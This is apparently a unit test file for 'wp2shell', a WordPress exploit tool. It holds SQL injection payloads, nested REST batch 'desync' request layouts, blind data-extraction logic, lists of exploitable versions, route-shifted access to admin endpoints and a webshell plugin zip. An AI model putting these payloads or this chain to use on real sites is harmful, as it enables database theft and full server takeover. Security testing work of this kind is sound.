#!/usr/bin/env python3
"""Tests for wp2shell.py — payload construction, extraction, response parsing."""
import io
import json
import sys
import unittest
import zipfile
from unittest import mock

import wp2shell as ws


# ── Response parsing ─────────────────────────────────────────────────────

class ResponseParseTests(unittest.TestCase):
    def setUp(self):
        self.client = ws.BatchClient("http://target")

    def test_injection_rows_returns_list(self):
        """injection_rows extracts the inner posts response body list."""
        rows_data = [{"id": 1, "title": "Hello"}, {"id": 2, "title": "World"}]
        payload = ws.Response(200, 0.1, json.dumps({
            "responses": [{}, {"body": {
                "responses": [{}, {"body": rows_data}]
            }}]
        }))
        result = self.client.injection_rows(payload)
        self.assertEqual(result, rows_data)

    def test_injection_rows_empty_returns_empty_list(self):
        """Empty posts list should be distinguishable from None."""
        payload = ws.Response(200, 0.1, json.dumps({
            "responses": [{}, {"body": {
                "responses": [{}, {"body": []}]
            }}]
        }))
        result = self.client.injection_rows(payload)
        self.assertEqual(result, [])

    def test_injection_rows_malformed_returns_none(self):
        """Malformed response returns None."""
        payload = ws.Response(500, 0.5, "not json")
        self.assertIsNone(self.client.injection_rows(payload))

    def test_injection_rows_wrong_structure_returns_none(self):
        """Wrong JSON structure returns None."""
        payload = ws.Response(200, 0.1, json.dumps({"responses": []}))
        self.assertIsNone(self.client.injection_rows(payload))


# ── Payload structure ────────────────────────────────────────────────────

class PayloadTests(unittest.TestCase):
    def setUp(self):
        self.client = ws.BatchClient("http://target")

    def test_payload_has_correct_outer_structure(self):
        """Outer batch: [primer, posts+inner, batch]."""
        pld = self.client._payload("0) OR 1=1-- -")
        reqs = pld["requests"]
        self.assertEqual(len(reqs), 3)
        self.assertEqual(reqs[0], ws.DESYNC_PRIMER)
        self.assertEqual(reqs[1]["method"], "POST")
        self.assertEqual(reqs[1]["path"], "/wp/v2/posts")
        self.assertEqual(reqs[2]["method"], "POST")
        self.assertEqual(reqs[2]["path"], "/batch/v1")

    def test_payload_has_correct_inner_structure(self):
        """Inner batch: [primer, users+sqli, posts]."""
        pld = self.client._payload("0) OR 1=1-- -")
        inner = pld["requests"][1]["body"]["requests"]
        self.assertEqual(len(inner), 3)
        self.assertEqual(inner[0], ws.DESYNC_PRIMER)
        self.assertTrue(inner[1]["path"].startswith("/wp/v2/users?author_exclude="))
        self.assertEqual(inner[1]["method"], "GET")
        self.assertEqual(inner[2]["method"], "GET")
        self.assertEqual(inner[2]["path"], "/wp/v2/posts")

    def test_payload_uses_users_route(self):
        """Uses /wp/v2/users which has no author_exclude schema constraint."""
        pld = self.client._payload("test")
        inner_path = pld["requests"][1]["body"]["requests"][1]["path"]
        self.assertTrue(inner_path.startswith("/wp/v2/users?author_exclude="))

    def test_payload_url_encodes_sqli(self):
        """SQLi payload is URL-encoded."""
        sqli = "0) OR SLEEP(5)-- -"
        pld = self.client._payload(sqli)
        inner_path = pld["requests"][1]["body"]["requests"][1]["path"]
        self.assertIn("SLEEP", inner_path)
        self.assertIn("%29", inner_path.lower())  # ')' should be encoded
        self.assertNotIn(" ", inner_path)  # spaces should be encoded

    def test_marker_probe_structure(self):
        """Marker probe: [primer, posts, block-renderer, batch]."""
        # Build the payload dict directly (marker_probe() would make a real HTTP call)
        pld = {
            "requests": [
                ws.DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts"},
                {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }
        reqs = pld["requests"]
        self.assertEqual(len(reqs), 4)
        self.assertEqual(reqs[0], ws.DESYNC_PRIMER)
        self.assertEqual(reqs[1]["path"], "/wp/v2/posts")
        self.assertEqual(reqs[2]["path"], "/wp/v2/block-renderer/core/archives")
        self.assertEqual(reqs[3]["path"], "/batch/v1")


# ── Marker probe error codes ──────────────────────────────────────────────

class MarkerTests(unittest.TestCase):
    def setUp(self):
        self.client = ws.BatchClient("http://target")

    def test_positive_marker(self):
        """All three codes present → desync detected."""
        resp = ws.Response(207, 0.1, json.dumps({
            "responses": [
                {"code": "parse_path_failed"},
                {"code": "block_cannot_read"},
                {"code": "rest_batch_not_allowed"},
            ]
        }))
        with mock.patch.object(self.client, "marker_probe", return_value=resp):
            result = ws.marker_probe(self.client)
        self.assertTrue(result.reachable)
        self.assertTrue(result.desync_detected)
        self.assertEqual(set(result.codes_found), ws.MARKER_CODES)

    def test_negative_marker(self):
        """Only one code → no desync."""
        resp = ws.Response(207, 0.1, json.dumps({
            "responses": [{"code": "parse_path_failed"}]
        }))
        with mock.patch.object(self.client, "marker_probe", return_value=resp):
            result = ws.marker_probe(self.client)
        self.assertTrue(result.reachable)
        self.assertFalse(result.desync_detected)

    def test_not_reachable(self):
        """Non-207 → not reachable."""
        resp = ws.Response(403, 0.1, "{}")
        with mock.patch.object(self.client, "marker_probe", return_value=resp):
            result = ws.marker_probe(self.client)
        self.assertFalse(result.reachable)
        self.assertFalse(result.desync_detected)


# ── Blind extractor ──────────────────────────────────────────────────────

class BlindExtractorTests(unittest.TestCase):
    def setUp(self):
        self.client = ws.BatchClient("http://target")
        self.extractor = ws.BlindExtractor(self.client)

    def test_is_true_with_rows(self):
        """Rows returned → condition is True."""
        rows_data = [{"id": 1}]
        with mock.patch.object(self.client, "inject") as mock_inject:
            mock_inject.return_value = ws.Response(207, 0.1, json.dumps({
                "responses": [{}, {"body": {
                    "responses": [{}, {"body": rows_data}]
                }}]
            }))
            self.assertTrue(self.extractor.is_true("1=1"))

    def test_is_false_with_no_rows(self):
        """Empty rows → condition is False."""
        with mock.patch.object(self.client, "inject") as mock_inject:
            mock_inject.return_value = ws.Response(207, 0.1, json.dumps({
                "responses": [{}, {"body": {
                    "responses": [{}, {"body": []}]
                }}]
            }))
            self.assertFalse(self.extractor.is_true("1=0"))

    def test_read_int_positive(self):
        """Integer extraction with valid response."""
        with mock.patch.object(self.extractor, "read_string",
                               return_value="  42  "):
            self.assertEqual(self.extractor.read_int("SELECT 42"), 42)

    def test_read_int_negative(self):
        """Negative integer extraction."""
        with mock.patch.object(self.extractor, "read_string",
                               return_value="-7"):
            self.assertEqual(self.extractor.read_int("SELECT -7"), -7)

    def test_read_int_rejects_non_integer(self):
        """Non-integer raises ValueError."""
        with mock.patch.object(self.extractor, "read_string",
                               return_value="not_a_number"):
            with self.assertRaises(ValueError):
                self.extractor.read_int("SELECT garbage")


# ── Fast extractor — X-WP-Total parsing ─────────────────────────────────

class FastExtractorTests(unittest.TestCase):
    def setUp(self):
        self.client = ws.BatchClient("http://target")

    def test_x_wp_total_present(self):
        """X-WP-Total extracted from response headers."""
        sub = {"headers": {"X-WP-Total": "5"}}
        self.assertEqual(ws.FastExtractor._x_wp_total(sub), 5)

    def test_x_wp_total_lowercase(self):
        """Lowercase header variant."""
        sub = {"headers": {"x-wp-total": "3"}}
        self.assertEqual(ws.FastExtractor._x_wp_total(sub), 3)

    def test_x_wp_total_missing(self):
        """Missing header → None."""
        sub = {"headers": {}}
        self.assertIsNone(ws.FastExtractor._x_wp_total(sub))

    def test_x_wp_total_non_int(self):
        """Non-integer header → None."""
        sub = {"headers": {"X-WP-Total": "abc"}}
        self.assertIsNone(ws.FastExtractor._x_wp_total(sub))

    def test_x_wp_total_headers_is_list(self):
        """List headers (rare) → None."""
        sub = {"headers": [{"X-WP-Total": "1"}]}
        self.assertIsNone(ws.FastExtractor._x_wp_total(sub))

    def test_parse_response_full_char(self):
        """Parse one character from 7 bit-probes."""
        # 'A' = 0x41 = bits 0,6 set
        num_chars = 1
        inner = [{}]  # primer at index 0 (ignored)
        for bit in range(ws.BITS_PER_CHAR):
            bit_val = 1 << bit
            # Bit 0 and bit 6 of 'A' are set
            has_row = 1 if (0x41 & bit_val) else 0
            inner.append({"headers": {"X-WP-Total": str(has_row)}})
            inner.append({})  # interleaved posts request (junk)
        resp = ws.Response(207, 0.1, json.dumps({
            "responses": [{}, {"body": {"responses": inner}}]
        }))
        chars = ws.FastExtractor._parse_response(resp, num_chars)
        self.assertEqual(chars, ["A"])

    def test_parse_response_null_termination(self):
        """Null byte ends string."""
        num_chars = 1
        inner = [{}]  # primer at index 0 (ignored)
        for bit in range(ws.BITS_PER_CHAR):
            inner.append({"headers": {"X-WP-Total": "0"}})
            inner.append({})
        resp = ws.Response(207, 0.1, json.dumps({
            "responses": [{}, {"body": {"responses": inner}}]
        }))
        chars = ws.FastExtractor._parse_response(resp, num_chars)
        self.assertEqual(chars, ["\x00"])

    def test_parse_response_malformed(self):
        """Malformed response returns None."""
        resp = ws.Response(500, 0.1, "not json")
        self.assertIsNone(ws.FastExtractor._parse_response(resp, 1))

    def test_build_payload_probes_per_char(self):
        """Each character generates BITS_PER_CHAR probes + interleaved posts."""
        expr = "SELECT 'A'"
        pld = ws.FastExtractor._build_payload(expr, 1, 2)
        inner = pld["requests"][1]["body"]["requests"]
        # primer + 2 chars * (BITS_PER_CHAR probes + BITS_PER_CHAR posts) = 1 + 2*7*2 = 29
        expected = 1 + 2 * ws.BITS_PER_CHAR * 2
        self.assertEqual(len(inner), expected)


# ── Timing confirmation ──────────────────────────────────────────────────

class TimingTests(unittest.TestCase):
    def setUp(self):
        self.client = ws.BatchClient("http://target")

    def test_timing_confirmed(self):
        """Slow responses confirm injection."""
        fast_resp = ws.Response(207, 0.05, "{}")
        slow_resp = ws.Response(207, 5.5, "{}")
        with mock.patch.object(self.client, "inject",
                               side_effect=[fast_resp, slow_resp] * 3):
            result = ws.timing_confirm(self.client, sleep=5.0, samples=3)
        self.assertTrue(result.confirmed)
        self.assertAlmostEqual(result.delta, 5.45, delta=0.1)

    def test_timing_not_confirmed(self):
        """No delay → not confirmed."""
        resp = ws.Response(207, 0.05, "{}")
        with mock.patch.object(self.client, "inject", return_value=resp):
            result = ws.timing_confirm(self.client, sleep=5.0, samples=3)
        self.assertFalse(result.confirmed)


# ── Version detection ────────────────────────────────────────────────────

class VersionTests(unittest.TestCase):
    def test_parse_simple(self):
        self.assertEqual(ws.parse_version("6.9.4"), (6, 9, 4))

    def test_parse_two_part(self):
        self.assertEqual(ws.parse_version("7.0"), (7, 0, 0))

    def test_parse_pathological(self):
        self.assertIsNone(ws.parse_version("whatever"))

    def test_affected_ranges(self):
        self.assertIn((6, 9, 4), ws.FULL_CHAIN_EXPLOITABLE)
        self.assertIn((7, 0, 1), ws.FULL_CHAIN_EXPLOITABLE)
        self.assertIn((6, 8, 3), ws.SQLI_ONLY_UNABLE_TO_REACH)

    def test_patched_versions(self):
        self.assertIn((6, 8, 6), ws.PATCHED)
        self.assertIn((6, 9, 5), ws.PATCHED)
        self.assertIn((7, 0, 2), ws.PATCHED)


# ── SQL escaping ─────────────────────────────────────────────────────────

class EscapeTests(unittest.TestCase):
    def test_escape_backslash(self):
        self.assertEqual(ws._escape_sql("a\\b"), "a\\\\b")

    def test_escape_single_quote(self):
        self.assertEqual(ws._escape_sql("it's"), "it\\'s")

    def test_escape_both(self):
        self.assertEqual(ws._escape_sql("\\'"), "\\\\\\'")


# ── AdminShell plugin zip ─────────────────────────────────────────────────

class AdminShellTests(unittest.TestCase):
    def test_plugin_zip_is_valid(self):
        session = ws.AdminShell("http://target")
        zdata = session._plugin_zip()
        with zipfile.ZipFile(io.BytesIO(zdata)) as zf:
            names = zf.namelist()
            self.assertEqual(len(names), 1)
            php_file = f"{session._slug}/{session._slug}.php"
            self.assertIn(php_file, names)
            php = zf.read(php_file).decode()
            self.assertIn("Plugin Name: wp2shell", php)
            self.assertIn(session._token, php)
            self.assertIn("hash_equals", php)

    def test_webshell_token_required(self):
        """Webshell should only respond with correct token."""
        session_wrong = ws.AdminShell("http://target")
        self.assertNotEqual(session_wrong._token, "deadbeef")

    def test_slugs_different(self):
        """Two sessions get different slugs."""
        s1 = ws.AdminShell("http://target")
        s2 = ws.AdminShell("http://target")
        self.assertNotEqual(s1._slug, s2._slug)
        self.assertNotEqual(s1._token, s2._token)


# ── Color class ──────────────────────────────────────────────────────────

# ── Route-shift dispatch ─────────────────────────────────────────────

class RouteShiftTests(unittest.TestCase):
    def setUp(self):
        self.client = ws.BatchClient("http://target")

    def test_route_shift_dispatch_structure(self):
        """Payload uses double-confusion to route-shift a target endpoint."""
        with mock.patch.object(self.client, "post") as mock_post:
            mock_post.return_value = ws.Response(207, 0.1, "{}")
            self.client.route_shift_dispatch("/wp/v2/users", "GET")
        pld = mock_post.call_args[0][0]
        reqs = pld["requests"]
        self.assertEqual(len(reqs), 3)
        self.assertEqual(reqs[0], ws.DESYNC_PRIMER)
        self.assertEqual(reqs[2]["path"], "/batch/v1")
        inner = reqs[1]["body"]["requests"]
        self.assertEqual(len(inner), 3)
        self.assertEqual(inner[1]["path"], "/wp/v2/users")
        self.assertEqual(inner[2]["path"], "/wp/v2/posts")

    def test_route_shifted_response_extracts_target(self):
        target_data = {"code": "rest_forbidden", "message": "Sorry"}
        resp = ws.Response(207, 0.1, json.dumps({
            "responses": [{}, {"body": {
                "responses": [{}, target_data]
            }}]
        }))
        result = self.client.route_shifted_response(resp)
        self.assertEqual(result, target_data)

    def test_route_shifted_response_malformed(self):
        resp = ws.Response(500, 0.1, "bad json")
        self.assertIsNone(self.client.route_shifted_response(resp))

    def test_route_shifted_response_wrong_structure(self):
        resp = ws.Response(207, 0.1, json.dumps({
            "responses": [{}, {"body": {"responses": []}}]
        }))
        self.assertIsNone(self.client.route_shifted_response(resp))

    def test_admin_probes_cover_auth_endpoints(self):
        paths = {p for _, p, _ in ws.ADMIN_PROBES}
        self.assertIn("/wp/v2/users", paths)
        self.assertIn("/wp/v2/settings", paths)
        self.assertIn("/wp/v2/plugins", paths)

    def test_secret_queries_select_only(self):
        for _, query in ws.SECRET_QUERIES:
            q = query.strip().upper()
            for kw in ("INSERT", "UPDATE", "DELETE", "DROP", "ALTER",
                       "CREATE", "TRUNCATE", "GRANT", "REVOKE"):
                self.assertNotIn(kw, q, f"{kw} in {query}")


class ColorTests(unittest.TestCase):
    def test_color_on(self):
        c = ws.C(on=True)
        text = c._(ws.C.R, "error")
        self.assertIn("\033[91m", text)
        self.assertIn("\033[0m", text)

    def test_color_off(self):
        c = ws.C(on=False)
        text = c._(ws.C.R, "error")
        self.assertEqual(text, "error")


if __name__ == "__main__":
    unittest.main()
